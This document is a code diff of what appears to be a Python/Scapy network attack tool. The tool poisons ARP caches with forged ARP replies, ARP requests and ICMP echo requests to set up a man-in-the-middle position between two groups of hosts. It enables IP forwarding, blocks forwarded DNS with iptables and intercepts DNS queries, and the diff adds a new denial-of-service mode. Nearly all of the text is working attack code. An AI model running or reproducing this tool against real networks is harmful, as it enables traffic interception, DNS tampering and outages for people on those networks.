@@ -3,6 +3,7 @@ from Forward import *
 from DNS import *
 import threading
 from config import config
+from discovery import ip_mac_cache
 
 # Forges an ICMP echo request, used for Solaris systems
 # Creates an ARP entry for the [src_ip] on the destination device
@@ -27,7 +28,7 @@ def forge_arp_request(src_ip, src_mac, dst_ip, dst_mac):
 		psrc=src_ip,
 		pdst=dst_ip,
 		hwsrc=src_mac,
-    	hwdst="00:00:00:00:00:00"
+		hwdst="00:00:00:00:00:00"
 	)
 	
 def poison_loop(forged_packets, interface, iterations, stop_event):
@@ -41,13 +42,13 @@ def poison_loop(forged_packets, interface, iterations, stop_event):
 		# For the first 5 poison batches use the warm up delay
 		if i < 5:
 			# Check if thread should stop every 1 second
-			for j in range(config.arp_poison_warm_up):
+			for j in range(config.arp.poison_warm_up):
 				time.sleep(1)
 				if stop_event.is_set():
 					return
 		else:
 			# Check if thread should stop every 1 second
-			for j in range(config.arp_poison_delay):
+			for j in range(config.arp.poison_delay):
 				time.sleep(1)
 				if stop_event.is_set():
 					return
@@ -63,21 +64,21 @@ def start_arp_mitm(group1, group2, self_mac, interface):
 		for (ip2, mac2) in group2:
 			if (ip1, mac1) != (ip2, mac2):
 				# ICMP echo request
-				if config.arp_poison_icmp:
+				if config.arp.poison_icmp:
 					forged_packets.append(forge_icmp_echo_request(ip2, ip1, mac1))
-					if not config.arp_poison_oneway:
+					if not config.arp.poison_oneway:
 						forged_packets.append(forge_icmp_echo_request(ip1, ip2, mac2))
 
 				# ARP reply
-				if config.arp_poison_reply:
+				if config.arp.poison_reply:
 					forged_packets.append(forge_arp_reply(ip2, self_mac, ip1, mac1))
-					if not config.arp_poison_oneway:
+					if not config.arp.poison_oneway:
 						forged_packets.append(forge_arp_reply(ip1, self_mac, ip2, mac2))
 
 				# ARP request
-				if config.arp_poison_request:
+				if config.arp.poison_request:
 					forged_packets.append(forge_arp_request(ip2, self_mac, ip1, mac1))
-					if not config.arp_poison_oneway:
+					if not config.arp.poison_oneway:
 						forged_packets.append(forge_arp_request(ip1, self_mac, ip2, mac2))
 
 	# event to signal that the poison_loop thread should stop
@@ -89,10 +90,7 @@ def start_arp_mitm(group1, group2, self_mac, interface):
 
 	return thread, stop_event
 
-	# todo find good timings for sending poison/stealth mode(?) (base on OS?)
-
-    
-def stop_arp_mitm(thread, group1, group2, stop_event, interface):
+def stop_arp_poison(thread, group1, group2, stop_event, interface):
 	print("Stopping ARP poisoning thread...")
 	# signal the poison thread to stop
 	stop_event.set()
@@ -105,15 +103,15 @@ def stop_arp_mitm(thread, group1, group2, stop_event, interface):
 		for (ip2, mac2) in group2:
 			if (ip1, mac1) != (ip2, mac2):
 				# ARP reply
-				if config.arp_poison_reply:
+				if config.arp.poison_reply:
 					forged_packets.append(forge_arp_reply(ip2, mac2, ip1, mac1))
-					if not config.arp_poison_oneway:
+					if not config.arp.poison_oneway:
 						forged_packets.append(forge_arp_reply(ip1, mac1, ip2, mac2))
 
 				# ARP request
-				if config.arp_poison_request:
+				if config.arp.poison_request:
 					forged_packets.append(forge_arp_request(ip2, mac2, ip1, mac1))
-					if not config.arp_poison_oneway:
+					if not config.arp.poison_oneway:
 						forged_packets.append(forge_arp_request(ip1, mac1, ip2, mac2))
 
 	print("Re-poisoning the victims to restore the valid ARP entries...")
@@ -123,19 +121,22 @@ def stop_arp_mitm(thread, group1, group2, stop_event, interface):
 	poison_loop(forged_packets, interface, 3, stop_event)
 
 # Gets the mac of the given ip by sending an arp broadcast
-# TODO: cache ip and mac pairs for faster mac return (optionally in discovery)
 def get_mac(ip, iface):
-    iface = iface
+	# If the ip mac pair is cached return it
+	if ip in ip_mac_cache:
+		return ip_mac_cache[ip]
 	
-    ans, _ = srp(
-        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
-        iface=iface,
-        timeout=2,
-        verbose=False
-    )
-    for _, rcv in ans:
-        return rcv[ARP].hwsrc
-    return None
+	ans, _ = srp(
+		Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
+		iface=iface,
+		timeout=2,
+		verbose=False
+	)
+	for _, rcv in ans:
+		mac = rcv[ARP].hwsrc
+		ip_mac_cache[ip] = mac
+		return mac
+	return None
 
 # Forwards a packet towards the destination by reconstructing its ethernet layer
 def forward_dns_pkt(pkt):
@@ -150,12 +151,12 @@ def forward_dns_pkt(pkt):
 	eth = Ether(src=get_if_hwaddr(iface), dst=mac)
 	sendp(eth / pkt[IP], iface=iface)
 	
-# Filter for DNS non-replayed DNS packets
+# Filter for non-replayed DNS packets
 def only_dns_request(pkt, self_mac):
-    return (
-        pkt.haslayer(DNS) and
+	return (
+	pkt.haslayer(DNS) and
 		pkt[Ether].src != self_mac
-    )
+	)
 
 def print_fn(pkt, interface):
 	if (pkt[DNS].qr == 0):
@@ -175,17 +176,25 @@ def allow_port_53():
 	run("iptables -D FORWARD -p tcp --dport 53 -j DROP")
 	
 def start_attack(group1, group2, self_ip, self_mac, interface):
-	enable_kernel_forwarding(interface)
+	if (config.arp.dos_enabled):
+		print("Starting DoS attack...")
+	else:
+		print("Starting MITM attack...")
+		enable_kernel_forwarding(interface)
 
 	thread, stop_event = start_arp_mitm(group1, group2, self_mac, interface)
-	drop_port_53()
 
-	intercept_pkts(self_mac, interface, only_dns_request, print_fn)
+	if not config.arp.dos_enabled and config.dns.enabled:
+		drop_port_53()
+		intercept_pkts(self_mac, interface, only_dns_request, print_fn)
+	else:
+		input("\nPress Enter to stop the attack...\n")
 
 	input("\nstop")
 
-	stop_arp_mitm(thread, group1, group2, stop_event, interface)
-	allow_port_53()
+	stop_arp_poison(thread, group1, group2, stop_event, interface)
+	if not config.arp.dos_enabled and config.dns.enabled:
+		allow_port_53()
 	cleanup_forward(interface)
 
 # placeholder
